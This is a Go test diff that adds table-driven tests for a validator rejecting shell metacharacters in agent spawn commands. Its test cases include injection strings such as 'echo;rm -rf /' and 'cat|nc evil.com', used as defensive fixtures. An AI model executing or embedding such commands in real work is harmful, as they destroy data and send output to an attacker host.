@@ -362,3 +362,60 @@ func TestList_UpdatesDurationForRunning(t *testing.T) {
 	dur2 := agents2[0].Duration
 	assert.Greater(t, dur2, dur1, "duration should increase for running agents")
 }
+
+// ---------------------------------------------------------------------------
+// validateAgentCommand
+// ---------------------------------------------------------------------------
+
+func TestValidateAgentCommand(t *testing.T) {
+	t.Parallel()
+
+	tests := []struct {
+		name    string
+		cmd     string
+		wantErr bool
+		errMsg  string
+	}{
+		{name: "valid binary", cmd: "python3", wantErr: false},
+		{name: "valid path", cmd: "/usr/bin/node", wantErr: false},
+		{name: "valid windows path", cmd: "C:/Program Files/node.exe", wantErr: false},
+		{name: "empty", cmd: "", wantErr: true, errMsg: "must not be empty"},
+		{name: "semicolon", cmd: "echo;rm -rf /", wantErr: true, errMsg: "forbidden character"},
+		{name: "pipe", cmd: "cat|nc evil.com", wantErr: true, errMsg: "forbidden character"},
+		{name: "ampersand", cmd: "echo&whoami", wantErr: true, errMsg: "forbidden character"},
+		{name: "dollar", cmd: "$HOME/evil", wantErr: true, errMsg: "forbidden character"},
+		{name: "backtick", cmd: "`id`", wantErr: true, errMsg: "forbidden character"},
+		{name: "null byte", cmd: "node\x00", wantErr: true, errMsg: "null byte"},
+		{name: "newline", cmd: "node\nrm", wantErr: true, errMsg: "forbidden character"},
+		{name: "control char", cmd: "node\x01", wantErr: true, errMsg: "control character"},
+		{name: "invalid utf8", cmd: "\xff\xfe", wantErr: true, errMsg: "invalid UTF-8"},
+	}
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			t.Parallel()
+			err := validateAgentCommand(tc.cmd)
+			if tc.wantErr {
+				require.Error(t, err)
+				assert.Contains(t, err.Error(), tc.errMsg)
+			} else {
+				require.NoError(t, err)
+			}
+		})
+	}
+}
+
+func TestSpawn_RejectsEmptyCommand(t *testing.T) {
+	tracker := NewAgentTracker(5, 30)
+	defer tracker.KillAll()
+	_, err := tracker.Spawn(context.Background(), "", nil)
+	require.Error(t, err)
+	assert.Contains(t, err.Error(), "must not be empty")
+}
+
+func TestSpawn_RejectsDangerousCommand(t *testing.T) {
+	tracker := NewAgentTracker(5, 30)
+	defer tracker.KillAll()
+	_, err := tracker.Spawn(context.Background(), "echo;rm -rf /", nil)
+	require.Error(t, err)
+	assert.Contains(t, err.Error(), "forbidden character")
+}
